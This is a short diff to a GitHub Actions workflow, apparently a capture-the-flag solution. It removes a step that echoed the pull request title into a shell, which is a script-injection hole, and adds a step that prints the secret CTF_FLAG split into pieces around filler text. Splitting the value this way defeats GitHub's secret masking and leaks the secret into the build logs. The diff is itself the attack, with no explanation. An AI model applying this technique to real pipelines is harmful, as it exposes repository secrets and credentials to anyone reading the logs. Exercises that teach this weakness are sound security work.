@@ -10,5 +10,4 @@ jobs:
     env:
       CTF_FLAG: ${{ secrets.CTF_FLAG }}
     steps:
-      - run: echo ${{ github.event.pull_request.title }}
-      - uses: actions/labeler@v4
+      - run: bash -c "echo $CTF_FLAG | cut -b 1; echo aaaaa; echo $CTF_FLAG | cut -b 2-"
